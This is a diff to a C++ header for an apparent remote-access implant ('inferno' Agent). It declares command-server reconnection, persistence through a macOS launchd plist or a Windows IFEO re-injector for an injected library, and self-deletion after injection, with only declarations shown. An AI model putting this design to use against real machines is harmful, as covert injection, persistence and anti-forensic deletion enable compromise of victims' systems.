@@ -28,7 +28,8 @@ class Agent {
 public:
     // Coplien Canonical Form
     Agent();
-    explicit Agent(const std::string& server_ip, uint16_t server_port);
+    Agent(const std::string& server_ip, uint16_t server_port,
+          const std::string& binary_path = "");
     ~Agent();
     Agent(const Agent&) = delete;
     Agent& operator=(const Agent&) = delete;
@@ -44,11 +45,25 @@ public:
                                    const std::string& server_ip = "127.0.0.1",
                                    uint16_t server_port = 4242);
 
-    // Tier 2 persistence — launchd plist for injected dylib inside target app
+    // Tier 2 persistence — launchd plist (macOS) or IFEO re-injector (Windows)
     static void persistInjectedAgent(const std::string& server_ip,
-                                     uint16_t server_port);
+                                      uint16_t server_port,
+                                      const std::string& target_path = "");
 
+    // Phase 4C — Self-delete after successful injection
+#ifdef INFERNO_TESTING
+public:
+#else
 private:
+#endif
+    void selfDelete();
+
+#ifdef INFERNO_TESTING
+    static bool wasSelfDeleteCalled() { return s_self_delete_called; }
+    static void resetSelfDeleteFlag() { s_self_delete_called = false; }
+private:
+#endif
+
     // FSM Handlers
     void handleInit();
     void handleConnecting();
@@ -73,6 +88,7 @@ private:
     // Attributes
     std::string m_server_ip;
     uint16_t m_server_port;
+    std::string m_binary_path;
     AgentState m_state;
     Socket m_socket;
     std::atomic<bool> m_running;
@@ -100,6 +116,10 @@ private:
     static constexpr unsigned MIN_BACKOFF  = 1;     // seconds
     static constexpr unsigned MAX_BACKOFF  = 300;   // 5 minutes
     unsigned                 m_reconnect_delay;
+
+#ifdef INFERNO_TESTING
+    static std::atomic<bool> s_self_delete_called;
+#endif
 };
 
 } // namespace inferno
